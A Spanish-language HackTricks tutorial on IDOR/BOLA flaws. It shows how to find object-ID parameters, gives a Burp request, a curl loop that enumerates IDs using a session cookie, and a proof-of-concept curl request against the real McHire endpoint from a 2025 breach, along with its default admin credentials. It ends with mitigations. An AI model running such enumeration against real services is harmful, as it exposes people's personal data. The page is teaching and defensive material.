# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) aparece cuando un endpoint web o API divulga o acepta un identificador controlado por el usuario que se utiliza **directamente** para acceder a un objeto interno **sin verificar que el llamador esté autorizado** para acceder/modificar ese objeto. La explotación exitosa normalmente permite la escalada de privilegios horizontal o vertical, como leer o modificar los datos de otros usuarios y, en el peor de los casos, la toma de control total de la cuenta o la exfiltración masiva de datos.

---
## 1. Identificando Potenciales IDORs

1. Busca **parámetros que hagan referencia a un objeto**:
* Ruta: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Consulta: `?id=42`, `?invoice=2024-00001`
* Cuerpo / JSON: `{"user_id": 321, "order_id": 987}`
* Encabezados / Cookies: `X-Client-ID: 4711`
2. Prefiere endpoints que **lean o actualicen** datos (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Nota cuando los identificadores son **secuenciales o predecibles** – si tu ID es `64185742`, entonces `64185741` probablemente existe.
4. Explora flujos ocultos o alternativos (por ejemplo, *"miembros del equipo Paradox"* enlace en páginas de inicio de sesión) que podrían exponer APIs adicionales.
5. Usa una **sesión autenticada de bajo privilegio** y cambia solo el ID **manteniendo el mismo token/cookie**. La ausencia de un error de autorización es generalmente un signo de IDOR.

### Manipulación manual rápida (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### Enumeración automatizada (Burp Intruder / bucle curl)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
---
## 2. Estudio de Caso del Mundo Real – Plataforma de Chatbot McHire (2025)

Durante una evaluación del portal de reclutamiento **McHire** impulsado por Paradox.ai, se descubrió el siguiente IDOR:

* Endpoint: `PUT /api/lead/cem-xhr`
* Autorización: cookie de sesión de usuario para **cualquier** cuenta de prueba de restaurante
* Parámetro del cuerpo: `{"lead_id": N}` – identificador numérico **secuencial** de 8 dígitos

Al disminuir `lead_id`, el evaluador recuperó PII **completa** de solicitantes arbitrarios (nombre, correo electrónico, teléfono, dirección, preferencias de turno) además de un **JWT** de consumidor que permitía el secuestro de sesión. La enumeración del rango `1 – 64,185,742` expuso aproximadamente **64 millones** de registros.

Solicitud de Prueba de Concepto:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combinado con **credenciales de administrador predeterminadas** (`123456:123456`) que otorgaron acceso a la cuenta de prueba, la vulnerabilidad resultó en una violación de datos crítica a nivel de empresa.

---
## 3. Impacto de IDOR / BOLA
* Escalación horizontal – leer/actualizar/eliminar datos de **otros usuarios**.
* Escalación vertical – un usuario de bajo privilegio obtiene funcionalidad solo para administradores.
* Violación masiva de datos si los identificadores son secuenciales (por ejemplo, IDs de solicitantes, facturas).
* Toma de control de cuentas al robar tokens o restablecer contraseñas de otros usuarios.

---
## 4. Mitigaciones y Mejores Prácticas
1. **Hacer cumplir la autorización a nivel de objeto** en cada solicitud (`user_id == session.user`).
2. Preferir **identificadores indirectos y no adivinables** (UUIDv4, ULID) en lugar de IDs autoincrementales.
3. Realizar la autorización **del lado del servidor**, nunca confiar en campos de formulario ocultos o controles de UI.
4. Implementar verificaciones de **RBAC / ABAC** en un middleware central.
5. Agregar **limitación de tasa y registro** para detectar enumeración de IDs.
6. Probar de seguridad cada nuevo endpoint (unitario, integración y DAST).

---
## 5. Herramientas
* **Extensiones de BurpSuite**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Proyectos de Github**: `bwapp-idor-scanner`, `Blindy` (caza de IDOR a granel).

{{#include ../banners/hacktricks-training.md}}

## Referencias
* [Plataforma de Chatbot McHire: Credenciales Predeterminadas y IDOR Exponen PII de 64M de Solicitantes](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Control de Acceso Roto](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [Cómo Encontrar Más IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
{{#include /banners/hacktricks-training.md}}
